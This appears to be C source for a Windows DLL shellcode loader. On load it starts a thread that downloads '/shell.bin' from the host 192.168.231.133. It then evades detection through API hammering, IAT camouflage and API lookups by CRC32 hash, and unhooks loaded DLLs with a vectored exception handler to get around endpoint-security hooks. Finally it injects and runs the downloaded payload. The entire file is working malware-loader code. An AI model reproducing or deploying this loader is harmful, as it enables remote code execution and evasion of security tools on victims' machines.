#include <windows.h>
#include "common.h"

unsigned char* pPayload = NULL;
PWSTR url = L"192.168.231.133";
PWSTR endpoint = L"/shell.bin";
SIZE_T sSize = (SIZE_T) NULL;

extern __declspec(dllexport) int Apex() {
    while (TRUE) {}
}

extern __declspec(dllexport) int Attack()
{
    PVOID        pVehHandler            = NULL;
    PVOID       pInjectedPayload    = NULL;


    ApiHammering(1000);

    if (pPayload == NULL || sSize == NULL)
    {
        return -1;
    }

    IatCamouflage();

    HMODULE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH( kernel32_handle, AddVectoredExceptionHandler_CRC32);
    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(kernel32_handle, RemoveVectoredExceptionHandler_CRC32);

    ApiHammering(1000);

    if (pAddVectoredExceptionHandler == NULL || pRemoveVectoredExceptionHandler == NULL)
    {
        return -1;
    }

    pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
    if (pVehHandler == NULL)
        return -1;

    ApiHammering(1000);

    UnhookAllLoadedDlls();

    if (!pRemoveVectoredExceptionHandler(pVehHandler))
        return -1;

    ApiHammering(1000);

    if (!Inject(&pInjectedPayload))
    {
        return -1;
    }

    ApiHammering(1000);

    Execute(pInjectedPayload);

    return 0;
}

EXTERN_C DWORD fetch_payload()
{
    sSize = Download(&pPayload, url, endpoint, FALSE);
    Attack();
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH: {
            CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}